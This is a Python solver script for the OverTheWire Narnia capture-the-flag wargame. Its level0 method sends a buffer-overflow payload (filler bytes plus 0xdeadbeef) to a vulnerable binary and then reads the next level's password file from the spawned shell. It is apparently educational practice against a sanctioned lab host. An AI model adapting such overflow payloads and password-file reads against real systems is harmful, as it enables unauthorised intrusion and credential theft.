"""Implementations of solutions for Narnia OTW levels."""
import functools
import textwrap

import solver_util

_get_password_from_shell = functools.partial(solver_util.get_password_from_shell,
        password_file_cbk=lambda lvl: '/etc/narnia_pass/narnia%d' % lvl)


class Solver(solver_util.AbstractSolver):
  """Solver for the Narnia OTW levels."""

  @classmethod
  def username(cls, level):
    return 'narnia{}'.format(level)

  @property
  def host(cls):
    return 'narnia.labs.overthewire.org'

  @property
  def port(self):
    return 2226

  def level0(self, proc):
    proc.sendline(
        "cat <(echo $(python -c 'print(20*\"B\"+\"\".join(map(chr, reversed([0xde, 0xad, 0xbe, 0xef]))))') &&"
        "      sleep 1 && echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0")
    proc.expect(r'\$ ')
    return proc.before.splitlines()[6]
